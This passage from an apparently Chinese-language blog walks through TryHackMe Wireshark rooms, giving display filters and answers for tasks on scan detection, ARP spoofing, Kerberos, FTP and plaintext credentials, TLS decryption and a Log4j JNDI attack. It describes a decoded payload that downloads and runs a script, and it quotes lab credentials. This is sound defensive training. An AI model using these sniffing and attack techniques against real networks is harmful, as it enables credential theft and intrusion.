id=\"task3-1\"><a href=\"#task3-1\" class=\"headerlink\" title=\"task3\"></a>task3</h2><p>直接看题目要求</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/packet/task3.png\" alt=\"task3\"></p>\n<p>第一问 问最多用的ipv4的目的地址</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/packet/destination.png\" alt=\"task3\"></p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/packet/destination1.png\" alt=\"task3\"></p>\n<p>ip为10.100.1.33 我搞不懂为啥前面还多一个 看格式就是第二个 第一个不知道咋蹦出来的</p>\n<p>第二问 我们还是在熟悉的地方 就是statistics 统计这 点开dns</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/packet/ipvx.png\" alt=\"task3\"></p>\n<p>在这找到services里的request-response time 能看到时间 0.467897</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/packet/dns1.png\" alt=\"task3\"></p>\n<p>第三rad.msn.com的http Requests </p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/packet/http.png\" alt=\"task3\"></p>\n<p>你会发现有两个rad.msn.com 直接相加就完事了</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/packet/http1.png\" alt=\"task3\"></p>\n<h2 id=\"task4-1\"><a href=\"#task4-1\" class=\"headerlink\" title=\"task4\"></a>task4</h2><p>这个是科普环节 将怎么使用wireshark的过滤器</p>\n<h3 id=\"捕获过滤器\"><a href=\"#捕获过滤器\" class=\"headerlink\" title=\"捕获过滤器\"></a>捕获过滤器</h3><table>\n<thead>\n<tr>\n<th>过滤规则</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>host 192.168.1.1</code></td>\n<td>仅捕获来自或发送到 192.168.1.1 的数据包</td>\n</tr>\n<tr>\n<td><code>net 192.168.1.0/24</code></td>\n<td>仅捕获 192.168.1.0&#x2F;24 子网的数据包</td>\n</tr>\n<tr>\n<td><code>port 80</code></td>\n<td>仅捕获端口 80（HTTP）的流量</td>\n</tr>\n<tr>\n<td><code>tcp</code></td>\n<td>仅捕获 TCP 数据包</td>\n</tr>\n<tr>\n<td><code>udp</code></td>\n<td>仅捕获 UDP 数据包</td>\n</tr>\n<tr>\n<td><code>tcp port 443</code></td>\n<td>仅捕获 TCP 端口 443（HTTPS）的流量</td>\n</tr>\n<tr>\n<td><code>src host 10.0.0.1</code></td>\n<td>仅捕获源 IP 为 10.0.0.1 的流量</td>\n</tr>\n<tr>\n<td><code>dst port 53</code></td>\n<td>仅捕获目标端口为 53（DNS）的数据包</td>\n</tr>\n</tbody></table>\n<h3 id=\"显示过滤器\"><a href=\"#显示过滤器\" class=\"headerlink\" title=\"显示过滤器\"></a>显示过滤器</h3><table>\n<thead>\n<tr>\n<th>过滤规则</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>ip.addr == 192.168.1.1</code></td>\n<td>过滤与 192.168.1.1 相关的所有流量</td>\n</tr>\n<tr>\n<td><code>ip.src == 10.0.0.1</code></td>\n<td>仅显示源 IP 为 10.0.0.1 的数据包</td>\n</tr>\n<tr>\n<td><code>ip.dst == 8.8.8.8</code></td>\n<td>仅显示目标 IP 为 8.8.8.8 的数据包</td>\n</tr>\n<tr>\n<td><code>tcp.port == 80</code></td>\n<td>仅显示 TCP 端口 80 的流量</td>\n</tr>\n<tr>\n<td><code>udp.port == 53</code></td>\n<td>仅显示 UDP 端口 53（DNS）的流量</td>\n</tr>\n<tr>\n<td><code>http</code></td>\n<td>仅显示 HTTP 流量</td>\n</tr>\n<tr>\n<td><code>dns</code></td>\n<td>仅显示 DNS 流量</td>\n</tr>\n<tr>\n<td><code>tcp.flags.syn == 1 &amp;&amp; tcp.flags.ack == 0</code></td>\n<td>仅显示 TCP SYN 包（新建连接）</td>\n</tr>\n<tr>\n<td><code>frame contains &quot;password&quot;</code></td>\n<td>仅显示数据包内容包含 “password” 的数据包</td>\n</tr>\n<tr>\n<td><code>eth.addr == aa:bb:cc:dd:ee:ff</code></td>\n<td>仅显示特定 MAC 地址的流量</td>\n</tr>\n</tbody></table>\n<h2 id=\"task5-1\"><a href=\"#task5-1\" class=\"headerlink\" title=\"task5\"></a>task5</h2><p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/packet/task5.png\" alt=\"task3\"></p>\n<p>第一问 我们直接在过滤器里面输入ip就能知道 共81420个数据包</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/packet/ip.png\" alt=\"ip\"></p>\n<p>第二问 问我们ttl值小于10的数据包有几个 能查到有66个</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/packet/ttl.png\" alt=\"ttl\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ip.ttl&lt;10</span><br></pre></td></tr></table></figure>\n\n<p>第三问 端口是4444的tcp数据包有几个</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/packet/tcp4444.png\" alt=\"4444\"></p>\n<p>有632个数据包</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tcp.port ==4444</span><br></pre></td></tr></table></figure>\n\n<p>第四问 80端口的http get数据包有几个</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/packet/tcp%2080.png\" alt=\"tcp 80\"></p>\n<p>共527个</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http.request.method=&quot;GET&quot; &amp;&amp; tcp.port==80</span><br></pre></td></tr></table></figure>\n\n<p>第五问 dns a级查询</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/packet/dnsa.png\" alt=\"tcp 80\"></p>\n<p>用这个查询会发现 这个数字并不是题目要求</p>\n<p>我们看一下显示过滤器</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/packet/dns2.png\" alt=\"tcp 80\"></p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/packet/dnsaa.png\" alt=\"tcp 80\"></p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/packet/dnsa.png\" alt=\"tcp 80\"></p>\n<h2 id=\"task6\"><a href=\"#task6\" class=\"headerlink\" title=\"task6\"></a>task6</h2><p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/packet/task6.png\" alt=\"task6\"></p>\n<p>ok 第一问找不是80端口的iis服务器的数据包 这里是两个条件 一个是iis服务器 一个是不能是80端口</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/packet/port80%20.png\" alt=\"ask\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http.server contains &quot;iis&quot; &amp;&amp; tcp.scrcport= 80 </span><br></pre></td></tr></table></figure>\n\n<p>就能筛选出来 共有21个</p>\n<p>第二问 找到所有版本是7.5的iis服务器</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/packet/7.5.png\" alt=\"iis\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http.server contains &quot;iis&quot; &amp;&amp; http.server contains &quot;7.5&quot; </span><br></pre></td></tr></table></figure>\n\n<p>用这个命令就能筛选出来 共71个</p>\n<p>第三问 3333，,4444，,9999端口共有几个数据包</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/packet/3333.png\" alt=\"sidan\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tcp.port in &#123;3333 4444 9999&#125;</span><br></pre></td></tr></table></figure>\n<p>共计2235个数据包</p>\n<p>第四问<br>ttl为偶数的数据包个数</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/packet/ttl1.png\" alt=\"ttl\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">strings(ip.ttl) matches &quot;[02468]$&quot;</span><br></pre></td></tr></table></figure>\n\n<p>过滤出来能发现有77289个数据包</p>\n<p>第五问<br>这个要去改config文件 改完使用专家视图去查看</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/packet/config.png\" alt=\"config\"></p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/packet/config1.png\" alt=\"config\"></p>\n<p>改完之后就可以去专家视图那边去查看Bad TCP Checksum的个数</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/packet/config3.png\" alt=\"config\"></p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/packet/config4.png\" alt=\"config\"></p>\n<p>最后一问<br>总算是轻松一点了<br>用已经存在的过滤器来筛选数据包  轻轻松松 能发现261个  </p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/packet/5.png\" alt=\"shujubao\"></p>\n<p>这两个wireshark就写到这里 收益还是很多的 在筛选器那里和导出文件 对wireshark的功能也熟悉了很多 至少不会像之前一样两眼懵逼的盯着屏幕<br>现在剩下最后一个问题了 流量分析！！！</p>\n<h2 id=\"traffic-Analysis\"><a href=\"#traffic-Analysis\" class=\"headerlink\" title=\"traffic Analysis\"></a>traffic Analysis</h2><p>前面的看完 我们看看流量分析</p>\n<p>这个是真有点小难度</p>\n<h2 id=\"task2-1\"><a href=\"#task2-1\" class=\"headerlink\" title=\"task2\"></a>task2</h2><p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/task2.png\" alt=\"task2\"></p>\n<h3 id=\"第一问\"><a href=\"#第一问\" class=\"headerlink\" title=\"第一问\"></a>第一问</h3><p>其实在这个文章中就有介绍怎么去过滤tcp connect的数据包</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tcp.flags.syn==1 and tcp.flags.ack==0 and tcp.window_size &lt;= 1024</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>syn &#x3D;&#x3D; 1就是用来确立连接的请求报文  </li>\n<li>ack&#x3D;&#x3D;0就是三次握手的第一步 </li>\n<li>tcp窗口的大小字段小于等于1024</li>\n</ul>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/tcp%20connect.png\" alt=\"ask1\"></p>\n<p>由图就能看出总数为1000个</p>\n<h3 id=\"第二问\"><a href=\"#第二问\" class=\"headerlink\" title=\"第二问\"></a>第二问</h3><p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/tcpconnect.png\" alt=\"ask2\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tcp.port == 80</span><br></pre></td></tr></table></figure>\n\n<p>第一个包会发现是tcp connect的数据包</p>\n<h3 id=\"第三问\"><a href=\"#第三问\" class=\"headerlink\" title=\"第三问\"></a>第三问</h3><p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/udpguabi.png\" alt=\"ask3\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">icmp.type == 3 &amp;&amp; icmp.code == 3</span><br></pre></td></tr></table></figure>\n\n<p>icmp.type &#x3D;&#x3D; 3意思就是目的地不可达</p>\n<p>icmp.code &#x3D;&#x3D; 3意思就是端口不可达</p>\n<p>这样就能查出有1083个关闭的端口</p>\n<h2 id=\"第四问\"><a href=\"#第四问\" class=\"headerlink\" title=\"第四问\"></a>第四问</h2><p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/udp1.png\" alt=\"ask4\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">udp.port in &#123;55..70&#125;</span><br></pre></td></tr></table></figure>\n\n<p>我们过滤出来之后分析一下这个数据包走向 前面67和69端口的数据包后面都显示没到达目的地 而68端口则显示成功 数据包一直在传输。说明68端口开放</p>\n<h2 id=\"task3-2\"><a href=\"#task3-2\" class=\"headerlink\" title=\"task3\"></a>task3</h2><p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/task3.png\" alt=\"task3\"></p>\n<h3 id=\"第一问-1\"><a href=\"#第一问-1\" class=\"headerlink\" title=\"第一问\"></a>第一问</h3><p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/284.png\" alt=\"ask1\"></p>\n<p>我们仔细观察就能发现攻击者的物理地址 就图片蓝色标的</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(arp.opcode== 1) &amp;&amp; (eth.src == 00:0c:29:e2:18:b4)</span><br></pre></td></tr></table></figure>\n\n<p>arp.opcode &#x3D;&#x3D; 1 就是过滤arp请求包</p>\n<p>其实单点一下你要的选项 把他拖到搜索栏那里就能自动输入 没有这么麻烦 就这个问题举例子 点到源地址这个选项 单击拖到搜索栏 选择and selected 就能自动输入</p>\n<h3 id=\"第二问-1\"><a href=\"#第二问-1\" class=\"headerlink\" title=\"第二问\"></a>第二问</h3><p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/httppacket.png\" alt=\"ask2\"></p>\n<p>这题是说攻击者收到的http包的数目 意思就是目的地应该是攻击者的地址才对 </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(http) &amp;&amp; (eth.dst == 00:0c:29:e2:18:b4)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"第三问-1\"><a href=\"#第三问-1\" class=\"headerlink\" title=\"第三问\"></a>第三问</h3><p>问用户名和密码的话 八层应该是与登录有关 我们搜一下关键词login 随便点进去看到有个可疑的值 uname和pass</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/number6.png\" alt=\"ask3\"></p>\n<p>把uname值拖到搜索栏搜一下 就能找到六个账户密码的条数</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/6.png\" alt=\"ask3\"></p>\n<h3 id=\"第四问-1\"><a href=\"#第四问-1\" class=\"headerlink\" title=\"第四问\"></a>第四问</h3><p>问一个账户的密码 我们就在上一题的地方找到Client986这个账户 在里面就能翻到密码clientnothere!</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/client986.png\" alt=\"ask4\"></p>\n<h3 id=\"第五问\"><a href=\"#第五问\" class=\"headerlink\" title=\"第五问\"></a>第五问</h3><p>我们在上一题找到Client986 我们把这个值拖到搜索栏 把Client986改成Client354 就能搜到与Client354有关的数据包 进去后在周围翻翻就能找到密码</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/nice354.png\" alt=\"ask5\"></p>\n<p>在周围翻翻就能找到密码</p>\n<h2 id=\"task4-2\"><a href=\"#task4-2\" class=\"headerlink\" title=\"task4\"></a>task4</h2><p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/task4.png\" alt=\"task4\"></p>\n<h3 id=\"第一问-2\"><a href=\"#第一问-2\" class=\"headerlink\" title=\"第一问\"></a>第一问</h3><p>问主机盖乐世a30的mac地址 那我们搜搜看有没有数据包有a30这个字段的</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/a30.png\" alt=\"ask1\"></p>\n<p>找到之后往上面找找地址 destination地址是cisco思科的企业协议 源地址估计就是我们想要的</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/a301.png\" alt=\"ask1\"></p>\n<h3 id=\"第二问-2\"><a href=\"#第二问-2\" class=\"headerlink\" title=\"第二问\"></a>第二问</h3><p>问工作站的netbios注册请求</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/lival.png\" alt=\"ask2\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nbns.name contains &quot;LIVALJM&quot; &amp;&amp; nbns.flags opcode == 5 </span><br></pre></td></tr></table></figure>\n\n<p>nbns.flags opcode &#x3D;&#x3D; 5 表示nbns的注册请求</p>\n<h3 id=\"第三问-2\"><a href=\"#第三问-2\" class=\"headerlink\" title=\"第三问\"></a>第三问</h3><p>问哪个主机请求的ip是172.16.13.85</p>\n<p>我们先搜一下dhcp 看一下数据包先 在最底下发现一行requested ip address 把这个值拖到搜索栏和dhcp一起搜索<br>记得加上我们题目说的ip</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/a12.png\" alt=\"ask3\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(dhcp) &amp;&amp; (dhcp.option.requested_ip_address == 172.16.13.85)</span><br></pre></td></tr></table></figure>\n\n<p>一搜一个准 找到主机名 盖乐世的a12</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/a121.png\" alt=\"ask3\"></p>\n<h3 id=\"第四问-2\"><a href=\"#第四问-2\" class=\"headerlink\" title=\"第四问\"></a>第四问</h3><p>找u5这个用户的ip </p>\n<p>CNameString在kerberos中就算是用户名 把这个参数拉到搜索栏 搜u5就行了</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/u5.png\" alt=\"ask4\"></p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/u51.png\" alt=\"ask4\"></p>\n<p>我这算很繁琐的步骤 用下面这个命令就一步到位了 知道ip是10.1.12.2 诶 要记住不能只填ip 他说是defanged ip</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kerberos.CNameString contains &quot;u5&quot;</span><br></pre></td></tr></table></figure>\n\n<p>科普一下<br>Defanged IP address”（去毒化的 IP 地址）是一种安全处理技术，于修改 IP 地址的显示格式，使其在文档、日志或安全报告中不被自动识别为可点击的链接，从而防止意外访问或自动化攻击。</p>\n<p>把.换成[.]就行了</p>\n<h3 id=\"第五问-1\"><a href=\"#第五问-1\" class=\"headerlink\" title=\"第五问\"></a>第五问</h3><p>要查主机名 在kerberos中主机名和用户名有点小区别</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/user.png\" alt=\"ask5\"></p>\n<p>就得在后面加个$ 所以我们就查CNameString带$的就行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kerberos.CNameString contains &quot;$&quot; </span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/xp1.png\" alt=\"ask5\"></p>\n<p>查到了一个叫xp1$的用户名</p>\n<h2 id=\"task5-2\"><a href=\"#task5-2\" class=\"headerlink\" title=\"task5\"></a>task5</h2><p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/task5.png\" alt=\"task5\"></p>\n<h3 id=\"第一问-3\"><a href=\"#第一问-3\" class=\"headerlink\" title=\"第一问\"></a>第一问</h3><p>问什么协议<br>这题其实我来说没多大灵感 就搜icmp然后往下翻翻 看看有哪个包的大小异常吗 结果发现还真有 点开看看 发现开头就发现了dh协议 ssh敲定了<br><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/ssh.png\" alt=\"ask1\"></p>\n<h3 id=\"第二问-3\"><a href=\"#第二问-3\" class=\"headerlink\" title=\"第二问\"></a>第二问</h3><p>开始就是搜索dns看看有什么大小异常的包吗 还是出乎意料 真有一个</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/data.png\" alt=\"ask2\"></p>\n<p>底下发下一个网站 把网址中的.转化成[.] 输进去发现成了</p>\n<p>这两个纯纯狗屎运</p>\n<h2 id=\"task6-1\"><a href=\"#task6-1\" class=\"headerlink\" title=\"task6\"></a>task6</h2><p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/task6.png\" alt=\"task2\"></p>\n<h3 id=\"第一问-4\"><a href=\"#第一问-4\" class=\"headerlink\" title=\"第一问\"></a>第一问</h3><p>问有几次登录失败</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ftp.response.code == 530</span><br></pre></td></tr></table></figure>\n\n<p>530：未登录，密码无效 刚好适合错误的登录尝试</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/error737.png\" alt=\"ask1\"></p>\n<h3 id=\"第二问-4\"><a href=\"#第二问-4\" class=\"headerlink\" title=\"第二问\"></a>第二问</h3><p>问的是文件大小 应该是和文件状态有关</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ftp.response.code == 213</span><br></pre></td></tr></table></figure>\n<p>213：文件状态</p>\n<p>输完命令之后我们点开追踪流检查一下</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/213.png\" alt=\"ask2\"></p>\n<p>发现有个39424大小的文件</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/2131.png\" alt=\"ask2\"></p>\n<h3 id=\"第三问-第四问\"><a href=\"#第三问-第四问\" class=\"headerlink\" title=\"第三问 &amp; 第四问\"></a>第三问 &amp; 第四问</h3><p>问文件名和升级文件权限的命令。<br>同样在这个追踪流里面可以看到。<br><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/chmod.png\" alt=\"ask2\"></p>\n<p>文件和命令都看见了。</p>\n<h2 id=\"task7\"><a href=\"#task7\" class=\"headerlink\" title=\"task7\"></a>task7</h2><p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/task7.png\" alt=\"task2\"></p>\n<h3 id=\"第一问-第二问\"><a href=\"#第一问-第二问\" class=\"headerlink\" title=\"第一问&amp;第二问\"></a>第一问&amp;第二问</h3><p>这一问纯玄学 问异常的类型<br><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/jizhong.png\" alt=\"ask1\"></p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/jizhong2.png\" alt=\"ask1\"></p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/jizhong4.png\" alt=\"ask1\"></p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/jizhong5.png\" alt=\"ask1\"></p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/jizhong6.png\" alt=\"ask1\"></p>\n<p>最后一个是mozilla和mozllla差了个字</p>\n<p>第二题刚好问了这个有差别的包的编号是什么 第52个</p>\n<h3 id=\"第三问-第四问-1\"><a href=\"#第三问-第四问-1\" class=\"headerlink\" title=\"第三问&amp;第四问\"></a>第三问&amp;第四问</h3><p>第几个包发动log4j攻击的</p>\n<p>问了问度娘<br>Log4j 是一个广泛使用的 Java 日志记录库，jndi（Java 命名和目录接口）是 Java 的一部分，允许 Java 应用程序查找和访问命名服务。</p>\n<p>输入命令搜一下 出现的第一个是编号444的包 </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ip contains &quot;jndi&quot;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/jndi.png\" alt=\"aks3\"></p>\n<p>点进去发现一个惊喜 应该是base64编码 拉到cyberchief里面解码<br><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/jndi1.png\" alt=\"aks3\"></p>\n<p>会发现在用wegt下载 设置权限 运行脚本 把ip转成defang的ip 就是第四题的答案<br><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/jizhong3.png\" alt=\"ask1\"></p>\n<h2 id=\"task8\"><a href=\"#task8\" class=\"headerlink\" title=\"task8\"></a>task8</h2><p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/task8.png\" alt=\"task2\"></p>\n<h3 id=\"第一问-5\"><a href=\"#第一问-5\" class=\"headerlink\" title=\"第一问\"></a>第一问</h3><p>问发送到“accounts.google.com”的“Client Hello”消息的框架编号是多少？</p>\n<p>Client Hello：tls.handshake.type &#x3D;&#x3D; 1<br>server Hello： tls.handshake.type &#x3D;&#x3D; 2  </p>\n<p>我们先收集一下所有的Client Hello 随便点一个点开他的server name 拉到搜索栏 server name改成‘accounts.google.com’<br><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/client.png\" alt=\"ask1\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(tls.handshake.type == 1)  &amp;&amp; (tls.handshake.extensions_server_name == &quot;accounts.google.com&quot;)</span><br></pre></td></tr></table></figure>\n\n<p>一下就搜出来了</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/16.png\" alt=\"ask1\"></p>\n<h3 id=\"第二问-5\"><a href=\"#第二问-5\" class=\"headerlink\" title=\"第二问\"></a>第二问</h3><p>导入秘钥 直接搜http2就出来了 共115个</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/http2.png\" alt=\"ask2\"></p>\n<h3 id=\"第三问-3\"><a href=\"#第三问-3\" class=\"headerlink\" title=\"第三问\"></a>第三问</h3><p>去322编号的数据包</p>\n<p>直接点开跟踪流 把网站的.弄成[.]</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/322.png\" alt=\"ask3\"></p>\n<h3 id=\"第四问-3\"><a href=\"#第四问-3\" class=\"headerlink\" title=\"第四问\"></a>第四问</h3><p>找这种数据包里的文件有个很diao的方法 我们导出文件</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/flag0.png\" alt=\"ask4\"></p>\n<p>点进去就能找到疑似flag的包</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/flag.png\" alt=\"ask4\"></p>\n<p>保存到桌面 查看一下就行了</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/flag1.png\" alt=\"ask4\"></p>\n<h2 id=\"task9\"><a href=\"#task9\" class=\"headerlink\" title=\"task9\"></a>task9</h2><p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/task9.png\" alt=\"task2\"></p>\n<h3 id=\"第一问-第二问-1\"><a href=\"#第一问-第二问-1\" class=\"headerlink\" title=\"第一问&amp;第二问\"></a>第一问&amp;第二问</h3><p>明文凭证 这一问都是在这里面完成</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/cred.png\" alt=\"ask\"></p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/cred1.png\" alt=\"ask\"><br>第一问的数据包编号就是237</p>\n<p>第二个就得看看数据包先 </p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/ftp1.png\" alt=\"ask\"></p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/ftp2.png\" alt=\"ask\"></p>\n<p>数据包基本就分这两类 user和pass 还有别的无关紧要的 要求是说空密码 就把 request command：pass那行拉去搜索</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/ftp.png\" alt=\"ask\"></p>\n<p>发现第170个包的pass空空的 没错了</p>\n<h2 id=\"task10\"><a href=\"#task10\" class=\"headerlink\" title=\"task10\"></a>task10</h2><p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/task10.png\" alt=\"task2\"></p>\n<p>照着题目点击对应的数据包 点开防火墙规则设置</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/fire0.png\" alt=\"ask\"></p>\n<p>把这两个规则复制粘贴就行 第二问要把deny改成allow 因为题目问的是允许</p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/fire.png\" alt=\"ask\"></p>\n<p><img src=\"/images/tryhackme-wireshark%E5%B0%8Ftips/traffic/fire2.png\" alt=\"ask\"></p>\n<p>wireshark三个部分总算肝完 其实也不算肝 就是内容小多 内容也干得要死 全是干货 过段时间更一下wireshark的实战 试试水</p>\n"},{"title":"tryhackme 密码学基础","date":"2025-02-10T03:10:37.000Z","top_img":"transparent","cover":"https://s2.loli.net/2025/02/14/ZeGbcFxgUvfNqP1.jpg","_content":"\n话说回来 